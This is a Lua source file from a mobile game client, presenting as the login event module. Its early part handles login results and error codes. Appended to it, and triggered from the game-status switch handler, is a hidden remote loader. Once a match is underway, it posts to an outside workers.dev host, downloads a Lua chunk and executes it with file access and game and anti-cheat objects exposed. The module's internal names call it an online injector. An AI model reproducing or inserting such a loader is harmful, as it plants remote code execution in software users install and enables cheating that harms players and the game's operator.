local logic_login_event={}
function logic_login_event:DefineAndResetData()
end
function logic_login_event:OnInitialize()
end
function logic_login_event:RegistEvents()
end
function logic_login_event:OnLogin(bReLogin)
end
function logic_login_event:OnLogOut()
end
function logic_login_event:OnPreSwitchGameStatus(preState,nextState)
end
function logic_login_event:OnPostSwitchGameStatus(preState,nextState)
pcall(function()
local entry=_G.MasterOnlineLoader
if entry and entry.Wake then entry.Wake()end
end)
end
function logic_login_event:HandleLoginResult(eventParam,eventParam2)
local IMSDKSystem=require("client.logic.login.logic_imsdk")
local SDKMacros=require("client.slua.config.ClientMacros.SDKMacros")
local IMSDKServerError=SDKMacros.IMSDKServerErrorCode
require("client.slua.config.ClientMacros.DevicePlatformNameMacros")
IMSDKSystem.StopIMSDKTimer()
NetUtil.noRefreshLogout=false
local SettingAccount=require("client.logic.setting.logic_setting_account")
SettingAccount.SetunifiedAccountLogging(false)
local SVPNSystem=require("client.slua.logic.gamemaster.logic_svpn")
SVPNSystem.OnIMSDKLoginResult(eventParam)
local logic_http_dns=require("client.slua.logic.httpdns.logic_http_dns")
logic_http_dns:OnMSDKLogin()
local logic_imsdk_interface=require("client.logic.login.logic_imsdk_interface")
logic_imsdk_interface:OnMSDKLogin()
local login_module=ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
local curStatus=GameStatus.GetGameStatus()
if eventParam~=0 then
login_module:ShowButtonsAfterLoginFailed()
if eventParam~=106 and eventParam~=611 and eventParam~=701 and eventParam~=2 then
NetUtil.LogoutNoRefresh()
end
EventSystem:postEvent(EVENTTYPE_LOGIN,EVENTID_LOGIN_FAIL_NETUTIL)
local logic_fb_web_login=require("client.logic.login.logic_fb_web_login")
if logic_fb_web_login:HandleLoginFail(eventParam,eventParam2)then
return
end
end
if eventParam==0 then
login_module:ClearLoginCountAndTime()
EventSystem:postEvent(EVENTTYPE_LOGIN,EVENTID_LOGIN_SUCCESS_NETUTIL)
local function UpdateEndCallBack()
if globalConfig.IsDirectConnect()==false and globalConfig.isSupervision==false then
local serverName=Client.GetUEPUBGMServerName()
if Client.IsUEPUBGM()and serverName~=""then
login_module:LoginByCp(serverName)
else
login_module:Transition(login_module.ELoginFSMEvent.Event_LTCS)
end
else
local Login_UIBP=UIManager.GetUI(UIManager.UI_Config.Login_UIBP)
if Login_UIBP then
Login_UIBP:OnQuickLogin()
end
login_module:ConnectToGate()
end
end
local version_up_module=ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.version_up_module)
if not version_up_module.bAlreadyGrayUpdate then
version_up_module:StartGrayUpdate(UpdateEndCallBack)
else
UpdateEndCallBack()
end
NetUtil.needInitCentauriWhenLogin=true
elseif eventParam==1001 or eventParam==1002 then
elseif(eventParam==211 or eventParam==9999)and eventParam2==IMSDKServerError.CHANNEL_OPENID_BANED then
local IMSDKHelper=import("IMSDKHelper")
local loginRetJson=IMSDKHelper.GetInstance():GetLastLoginResultJson()
local loginRet=json.decode(loginRetJson)
if loginRet.thirdRetCode==IMSDKServerError.CHANNEL_OPENID_BANED then
local thridMsgJson=loginRet.thirdRetMsg
local thridMsg=json.decode(thridMsgJson)
local openid=thridMsg.iOpenid
local channel=thridMsg.iChannel
local msg=thridMsg.msg
local bandEndTime=thridMsg.iBanEnd
login_module:ShowFreezePopupUI(openid,channel,bandEndTime)
end
elseif 9999<=eventParam and eventParam<=100000 then
login_module:UpdateLoginCountAndTime()
if curStatus==GameStatus.Login then
self:ShowLoginFailNotice(NetUtil.GetSDKErrorNotice(eventParam,eventParam2),nil,eventParam,eventParam2)
end
elseif eventParam==611 then
local client_imsdk_eventparam=require("client.logic.ClientEntry.client_imsdk_eventparam")
login_module:UpdateLoginCountAndTime()
self:ShowLoginFailNotice(NetUtil.GetSDKErrorNotice(eventParam,eventParam2),nil,eventParam,eventParam2)
else
if eventParam~=-1 and eventParam~=6 and eventParam~=7 and eventParam~=106 and eventParam~=107 and eventParam~=109 and eventParam~=200 then
if curStatus~=GameStatus.Login then
return
end
login_module:UpdateLoginCountAndTime()
self:ShowLoginFailNotice(NetUtil.GetSDKErrorNotice(eventParam,eventParam2),nil,eventParam,eventParam2)
return
end
login_module:UpdateLoginCountAndTime()
login_module:ShowLoginUI()
end
end
function logic_login_event:ShowLoginFailNotice(notice,extraParams,eventParam,eventParam2,_mockErrorCode)
self:FlashLoginFail(LocUtil.GetLocalizeResStr(101001),notice,extraParams)
end
function logic_login_event:FlashLoginFail(title,fullNotice,extraParams)
local login_module=ModuleManager.GetModule(ModuleManager.LobbyModuleConfig.login_module)
local CommonMsgBoxMgr=require("client.slua.logic.common.logic_common_msg_box")
CommonMsgBoxMgr.Show(1,title,fullNotice,function()
login_module:ShowLoginUI()
end,nil,nil,nil,extraParams)
end
function logic_login_event:MatchLoginErrorCodeConfig(eventParam,eventParam2,system,loginChannel)
return nil
end
local class=require("class")
local CModuleBase=require("client.module_framework.ModuleBase")
local CLogicLoginEvent=class(CModuleBase,nil,logic_login_event)
do
local ok,problem=pcall(function()
local function CreateOnlineEnvironment()
local modules,hostRequire=package.loaded,require
local function allowed(name)
return type(name)=="string"and(name:sub(1,8)=="GameLua."
or name:sub(1,7)=="client."or name:sub(1,7)=="common.")
end
local function moduleValue(name)
if allowed(name)then
local value=modules[name]
if not rawequal(value,_G)then return value end
end
end
local loaded=setmetatable({},{
__index=function(_,name)return moduleValue(name)end,
__newindex=function(_,name,value)
assert(allowed(name)and not rawequal(value,_G),"Module unavailable")
modules[name]=value
end,
__pairs=function()
local name
return function()
repeat name=next(modules,name)until name==nil or moduleValue(name)~=nil
if name then return name,moduleValue(name)end
end
end
})
local env={
io=io and{open=io.open},
os=os and{clock=os.clock,getenv=os.getenv,remove=os.remove,
rename=os.rename,time=os.time},
slua={isValid=slua.isValid,getWorld=slua.getWorld,loadObject=slua.loadObject},
package={loaded=loaded}
}
local names="assert error ipairs next pairs pcall xpcall load print rawget select setmetatable "
.."tonumber tostring type math string table utf8 import CGame Client EventSystem Game "
.."ModuleManager UEnums UIManager slua_GameFrontendHUD FVector2D FVector FLinearColor FAnchors "
.."GameplayCallbacks TssSdk AvatarCheckCallback Replay_IsEnemyFrameUIExisted "
.."Replay_CreateEnemyFrameUI ReportEnemyFrameUI"
for name in names:gmatch("%S+")do env[name]=_G[name]end
env.unpack=unpack or table.unpack
env._G=env
env.require=function(name)
assert(allowed(name),"Module unavailable")
local value=hostRequire(name)
assert(not rawequal(value,_G),"Module unavailable")
return value
end
return env
end
local url="https://masterahsan-lua.masterahsanyt2021.workers.dev/"
local state=_G.__MasterAhsanRemoteLoaderV1
if type(state)=="table"and state.URL==url and(state.Started or state.Loaded or state.Terminal)then
_G.MasterOnlineLoader=state
return
end
if type(state)~="table"or state.Version~=3 or state.URL~=url then
state={Version=3,URL=url}
_G.__MasterAhsanRemoteLoaderV1=state
end
_G.MasterOnlineLoader=state
if type(state.Wake)=="function"then state.Wake();return end
local step,timer
local function current()
return _G.__MasterAhsanRemoteLoaderV1==state and state.Active and not state.Started
end
local function schedule(delay)
if not current()then return end
local token,arming={},true
state.Pending=token
local ok,accepted=pcall(timer.AddTimerOnce,delay,function()
if arming then state.Active,state.Pending,state.Error=false,nil,"TimerUnavailable";return end
if not current()or state.Pending~=token then return end
state.Pending=nil
step()
end)
arming=false
if not ok or accepted==false then state.Active,state.Pending,state.Error=false,nil,accepted end
end
local function readyHTTP()
if not Client or not GameStatus or GameStatus.GetGameStatus()~=GameStatus.Fighting then return end
local data=require("GameLua.GameCore.Data.GameplayData")
if not slua.isValid(data.GetPlayerCharacter())or not slua.isValid(data.GetPlayerController())then return end
if not CGame or not CGame.NewObjectFromPath or not UEnums or not UEnums.ESlateVisibility then return end
local ui=require("GameLua.Mod.BaseMod.Common.UI.InGameUITools").GetMainControlBaseUI()
if not slua.isValid(ui)or not(slua.isValid(ui.CanvasPanel_0)or slua.isValid(ui.CanvasPanel_42))then return end
return ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
end
step=function()
if not current()or state.InFlight then return end
local ready,http=pcall(readyHTTP)
if not ready or not http or not http.Post then schedule(0.25);return end
if state.Body~=nil then
local body=state.Body
state.Body=nil
local compiled,chunk,problem=pcall(function()
state.Env=CreateOnlineEnvironment()
return load(body,"@2.lua","t",state.Env)
end)
if not compiled or type(chunk)~="function"then
state.Error=compiled and problem or chunk
schedule(1)
return
end
state.Active,state.Started,state.Terminal,state.Error=false,true,true,nil
local ran,problem=pcall(chunk)
state.Loaded,state.Error=ran,not ran and problem or nil
return
end
state.InFlight=true
local settled=false
local function finish(success,body)
if settled then return end
settled=true
if not current()or not state.InFlight then return end
state.InFlight=false
local accepted=success and type(body)=="string"
if accepted then state.Body=body end
schedule(accepted and 0.05 or 1)
end
local armed,watchdog=pcall(timer.AddTimerOnce,10.5,function()finish(false)end)
if not armed or watchdog==false then finish(false);return end
if settled or not current()then return end
local sent,ticket=pcall(http.Post,http,url,
{["Content-Type"]="application/x-www-form-urlencoded",["User-Agent"]="LuaClient/1.0"},
"key_path=2.lua",nil,finish,10)
if not sent or ticket==false or ticket==0 then finish(false)end
end
state.Wake=function()
if not current()and not state.Started and _G.__MasterAhsanRemoteLoaderV1==state then
timer=require("common.time_ticker")
if type(timer)~="table"or type(timer.AddTimerOnce)~="function"then state.Error="TimerUnavailable";return end
state.Active=true
schedule(0.05)
end
end
state.Wake()
end)
if not ok then _G.MasterOnlineInjectorError=problem end
end
return CLogicLoginEvent
